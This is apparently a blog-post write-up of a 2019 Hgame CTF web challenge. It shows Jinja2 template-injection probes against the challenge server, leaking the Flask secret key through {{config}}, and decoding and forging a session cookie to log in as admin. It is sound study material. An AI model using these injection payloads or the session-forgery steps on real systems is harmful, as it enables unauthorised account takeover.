---
title: Lab - CTF：2019-Hgame-Web-Week4
date: 2019-11-13 11:11:11 -0400
description: Learning Path
categories: [Lab, CTF]
# img: /assets/img/sample/rabbit.png
tags: [Lab, CTF]
---

[toc]

---

# CTF：2019-Hgame-Web-Week4

flask/jinjia2模板注入，

```
http://118.25.18.223:3001/{{1+1}} //输出hello 2，确定是模板注入
http://118.25.18.223:3001/{{config}}
```

![20190223211856417](https://i.imgur.com/w0r5P8s.png)

```
http://118.25.18.223:3001/{{''.__class__.__mro__}}
发现可以，觉得大概是沙箱逃逸了
```

伪造session登陆


注入`{{config}}`得到了`secret_key`，
- 抓取session利用GitHub的`session_cookie_manager.py`解密`session`，
- 发现user_id是个数字，把它改成 admin 加密后访问失败。
- 注册两个新账号whd1/whd2发现其 user_id 为 164/165
- 猜测admin的user_id为01.
- 成功得到flag

```py
$ python2.exe session_cookie_manager.py decode -s "9RxdzNwq7!nOoK3*" -c ".eJxxxxxxxxx"
{u'csrf_token':u'xxxxxxxx', u'_fresh':True, u'user_id':u'28', u'_id':u'xxxxxxxx'}
```


![20190223211926119](https://i.imgur.com/yn48wFR.png)
